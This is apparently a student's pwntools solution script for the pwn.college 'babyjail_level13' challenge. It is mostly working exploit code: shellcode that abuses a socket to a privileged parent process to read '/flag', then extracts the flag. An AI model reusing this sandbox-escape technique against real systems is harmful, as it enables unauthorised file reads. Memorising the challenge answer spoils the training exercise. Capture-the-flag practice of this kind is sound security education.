# Nagib lakhdari 3si2
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn
import re

BINARY = "/challenge/babyjail_level13"
LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
LD = "/lib64/ld-linux-x86-64.so.2"

exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8 = pwn.p8
u8 = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
continue
'''.format(**locals())

assembly = """
xor rax, rax
push 4
pop rdi
lea rsi, [rip + flag_name]
push 60
pop rdx
push 1
pop rax
syscall

push 4
pop rdi
lea rsi, [rip + flag_content]
push 60
pop rdx
xor rax, rax
syscall

push 4
pop rdi
lea rsi, [rip + do_print]
push 128
pop rdx
push 1
pop rax
syscall

do_print:
.ascii "print_msg:"
flag_content:
.rept 60
.byte 0
.endr

flag_name:
.asciz "read_file:/flag"
"""

def exploit():
    with pwn.process([BINARY]) as p:
        p.send(pwn.asm(assembly))
        response = b""
        while True:
            try:
                chunk = p.recv(128)
                if not chunk:
                    break
                response += chunk
            except EOFError:
                break
        flag_match = re.search(rb'pwn\.college\{.*?\}', response)
        if flag_match:
            flag = flag_match.group(0).decode()
            print(f'Flag: {flag}')
        else:
            print("Flag not found in response.")
            
if __name__ == "__main__":
    exploit()
